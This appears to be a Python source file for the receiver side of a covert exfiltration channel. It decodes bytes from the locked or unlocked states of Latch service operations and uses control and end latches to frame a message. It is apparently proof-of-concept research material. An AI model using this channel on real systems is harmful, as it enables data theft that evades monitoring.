# -*- coding: utf-8 -*-
from latch_exfiltration import LatchExfiltration
import time
import os


class LatchExfiltrationReader(LatchExfiltration):

    def __init__(self):
        LatchExfiltration.__init__(self)
        #self.read_exfiltrated_message()
    
    def read_exfiltrated_byte(self):
        """Get the exfiltrated byte of latch and converts it into its ascii representation
        
        Returns:
            String -- Ascii representation of the byte
        """
        ascii_parsed = self.parse_byte()
        byte_converted = self.ascii_to_string(ascii_parsed)
        self.latch.unlock_latch(self.dict_converted.get('control', ''))
        print('Receiving: ' + byte_converted + ' ---> ' + ascii_parsed)
        return byte_converted

    def parse_byte(self):
        """Check every latch operation to get the character
        
        Returns:
            String -- bits of the Ascii value of the given character
        """
        ascii = ''
        for num in range(1, 9):
            latch_string = self.dict_converted.get(str(num), '')
            ascii += '1' if self.latch.get_operation_status(latch_string) else '0'
        return ascii

    def read_exfiltrated_message(self):
        """Read the given message until the 'end' latch is locked
        
        Returns:
            String -- The message exfiltrated
        """
        print('Listening...')
        message = ''
        while not self.latch.get_operation_status(self.dict_converted.get('end', '')):
            if self.latch.get_operation_status(self.dict_converted.get('control', '')):
                message += self.read_exfiltrated_byte()
            else:
                if not message:
                    self.latch.lock_latch(self.dict_converted.get('reader', ''))
                time.sleep(0.2) 
        print('Message: ' + message)
        return message
